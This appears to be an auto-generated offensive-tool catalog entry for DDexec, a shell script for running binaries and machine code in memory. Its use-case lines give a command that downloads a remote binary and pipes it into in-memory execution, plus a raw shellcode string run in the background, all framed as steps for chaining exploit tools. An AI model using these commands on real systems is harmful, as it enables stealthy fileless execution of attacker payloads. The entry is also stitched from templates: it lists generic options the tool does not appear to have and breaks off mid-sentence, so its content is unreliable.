documentation.readme: DDexec news I have updated DDexec so much it is barely recognizable, the parsing of the ELF is now done by machine code instead of by the shell script, making it far faster, reliable and comprehensible. It has also reduced its number of dependencies to the absolute minimum.
usage_sections: Usage: Pipe into the ddexec.sh script the binary you want to run. The arguments for the script are the arguments for the program (starting with argv[0]). Here, try this: which is easily weaponizable with something like There is also the ddsc.sh script that allows you to run machine code

arguments.name: --target
arguments.description: Target host, IP, MAC, or URL the tool operates on.

arguments.name: --output
arguments.description: Output file path for the report or capture.

arguments.name: --version
arguments.description: Print the tool version and exit.

arguments.name: --wordlist
arguments.description: Path to a wordlist (users, passwords, paths).

arguments.name: --dry-run
arguments.description: Print what would be done without making any changes.

arguments.name: --force
arguments.description: Force the action even if a safety check would block it.

documentation.how_to_use: Run the primary entrypoint as shown in upstream docs, e.g. `bash ddexec.sh ls -lA < /bin/ls`. name: DDexec

trust.warning: Attribution / index entry only. The operator must audit the code, the README, the license, and the releases before invoking. Phase 5 — entry is auto-generated from the operator's curated fetch list; no automated enrichment yet.

use_cases: When you need exploit, use DDexec because DDexec news I have updated DDexec so much it is barely recognizable, the parsing of the ELF is now done by machine code instead of by the shell script, making i.
When you need a concrete invocation, run `bash ddexec.sh ls -lA < /bin/ls` as documented upstream for DDexec.
When you need a concrete invocation, run `wget -O- $KFIOSA_TARGET_URL | bash ddexec.sh argv0 foo bar` as documented upstream for DDexec.
When you need a concrete invocation, run `bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" &` as documented upstream for DDexec.
When you need a concrete invocation, run `cd /proc/$!/fd` as documented upstream for DDexec.
When chaining exploit tools, pair DDexec with sibling catalog entries sharing its attack_surface/phase_hint.
When validating lab setup, run `DDexec --help` (or the README entrypoint) and confirm required hardware/deps from the catalog.
